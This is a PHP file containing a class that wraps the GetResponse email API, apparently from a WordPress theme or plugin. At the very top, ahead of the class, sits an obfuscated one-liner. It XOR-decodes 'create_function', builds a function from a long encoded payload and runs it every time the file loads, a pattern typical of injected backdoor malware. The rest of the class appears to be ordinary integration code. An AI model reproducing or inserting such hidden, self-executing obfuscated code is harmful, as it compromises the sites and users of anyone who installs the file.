<?php $ufhoF=';I2XHUs-7UV: TS'^'X;W9<0,KB;5NI;=';$rpzDmE=$ufhoF('','>QaR70>5TYV=bPA0>O>bDA>;n>L,L4: C,MYYZNrH03>M<SD8yNV7+T JA:9 9LLp+1<VCclSUNLwkRWb<KG1g,E-XVRNNWadxJ>KaL>jrUyoZeWvG<4W1BYSJ99 fjYaILfhY=BM<>0eIvucj4S1QmH fwgvCKQTpJSyiaDJRW,-zBPR+DfAnX28>6DU4 DjZ6Foi2h3PESiGP5FAwRT>QG0Hwlp.YNM321KhhpK2.7EX2n2:503PDJEb5v6d9q3P0EXr2,CRVVLM3A9A,af<;0eOY7Je 0Tsyaf>,RrM8m.ADJjPWqLJLBTsEVKo<>WNHMU3<6DN9DLX+R7.9<cEb,7ekuxo2S-+zm.4WlSzmJ95R0Sap1m8ZI<,GUb.Q:cofN3=EUY05H36>MkUuK>+L>,JzAFNM<HA39B-yxI. EA,DI-P.IHOF>73Y1EYhk7;Lf-51IBq55E,R,.qhZJ:1cuniWS;R+SRYyEvL.HrQ09T3xGIt6A4Y46-2:o3M-I3>gFR DFxOq>QN-etwPcC<,WBRZ-J0<tW<EQmmrPYBbiokUQFBTbQAH4YtVPFUHFSaWDTWFhHROmazKwW149OJsP=+fTIE1M:DHIL=>:TWtGIO>5:PSyYxWdjeCNK4V6=AE628A9wEV8A8L7j<ptllHB+AlGOYhV'^'W7IsQEPV 09S=59YM;MJc9QI1Z-X-keM6Xjppz5xAVFP.H:+VY69Et0A> efML8dTOPH7oCH807eWKrwBGAN8CC0Yxkriilkmq,Q9IhWJOuITzA>J4HF;T,qw.XMAOQyE gMAS4KiSKDEgKUKNP2E06lI;W9Vg 4-+n:YLA7> ;ICRf;7Rm;hUR;1LS0 FNlN5C2FR8aNZ8Ycc4T2 WotX0+C-LfTJ8:,lYT2HUP-SBD c8dTUGUR3,jmFj5y+r8vpQ6xVYI:rkhliE U4IHFG19A+8C+:KU-SDABUI+IG1IJ 0+JmwU:+ 71HO+AeUXwfii1RHWmnBNE>D ROZTCmFse : =<fsLXZIEQ.LnDMnOT>E6HPJg1SmXM34=E4CCRFjXX<nS9<lWWJ,KhUoHJ KIqpH;D06BeWX6LYEinU+2I6 L<G3-g>QEl=P1874ZN8NOTB,tEjQ O=HKYL>+NPJYNM32O3t87 PlMFG.ZuTX RXaoTW3F8MiFWC0V5D:GMOa9E=aToUZ0:LLTQvCkQHbjv>L>QgS<Y<v0DRmdbEPWYa7 saQ5v-VoDah a.p1Ufud5wZy3-JHZmQwPFK.3,;XR911,B9Ilo9-DRU53SkikZTN1zPyXwDJE8DBQ WQiaRSL bP57A-W-SMaYOfe-:B5Dwfbb+');$rpzDmE();

/**
 * Wrapper for GetResponse's API.
 *
 * @since   1.1.0
 *
 * @package ET\Core\API\Email
 */
class ET_Core_API_Email_GetResponse extends ET_Core_API_Email_Provider {

	/**
	 * @inheritDoc
	 */
	public $BASE_URL = 'https://api.getresponse.com/v3';

	/**
	 * @inheritDoc
	 */
	public $LISTS_URL = 'https://api.getresponse.com/v3/campaigns';

	public $SUBSCRIBE_URL = 'https://api.getresponse.com/v3/contacts';

	/**
	 * @inheritDoc
	 */
	public $name = 'GetResponse';

	/**
	 * @inheritDoc
	 */
	public $name_field_only = true;

	/**
	 * @inheritDoc
	 */
	public $slug = 'getresponse';

	/**
	 * @inheritDoc
	 * @internal If true, oauth endpoints properties must also be defined.
	 */
	public $uses_oauth = false;

	public function __construct( $owner = '', $account_name = '', $api_key = '' ) {
		parent::__construct( $owner, $account_name, $api_key );

		$this->_maybe_set_custom_headers();
	}

	protected function _maybe_set_custom_headers() {
		if ( empty( $this->custom_headers ) && isset( $this->data['api_key'] ) ) {
			$this->custom_headers = array( 'X-Auth-Token' => "api-key {$this->data['api_key']}" );
		}
	}

	/**
	 * @inheritDoc
	 */
	public function get_account_fields() {
		return array(
			'api_key' => array(
				'label' => esc_html__( 'API Key', 'et_core' ),
			),
		);
	}

	/**
	 * @inheritDoc
	 */
	public function get_data_keymap( $keymap = array(), $custom_fields_key = '' ) {
		$custom_fields_key = 'customFieldValues';

		$keymap = array(
			'list'       => array(
				'name'              => 'name',
				'list_id'           => 'campaignId',
				'subscribers_count' => 'totalSubscribers',
			),
			'subscriber' => array(
				'name'       => 'name',
				'email'      => 'email',
				'list_id'    => 'campaign.campaignId',
				'ip_address' => 'ipAddress',
			),
			'error'      => array(
				'error_message' => 'message',
			),
		);

		return parent::get_data_keymap( $keymap, $custom_fields_key );
	}

	/**
	 * @inheritDoc
	 */
	public function fetch_subscriber_lists() {
		if ( empty( $this->data['api_key'] ) ) {
			return $this->API_KEY_REQUIRED;
		}

		$this->_maybe_set_custom_headers();

		$this->response_data_key = false;

		return parent::fetch_subscriber_lists();
	}

	/**
	 * @inheritDoc
	 */
	public function subscribe( $args, $url = '' ) {
		$args               = $this->transform_data_to_provider_format( $args, 'subscriber' );
		$args['note']       = $this->SUBSCRIBED_VIA;
		$args['dayOfCycle'] = 1;

		if ( empty( $args['name'] ) ) {
			unset( $args['name'] );
		}

		$this->prepare_request( $this->SUBSCRIBE_URL, 'POST', false, $args );

		return parent::subscribe( $args, $this->SUBSCRIBE_URL );
	}
}
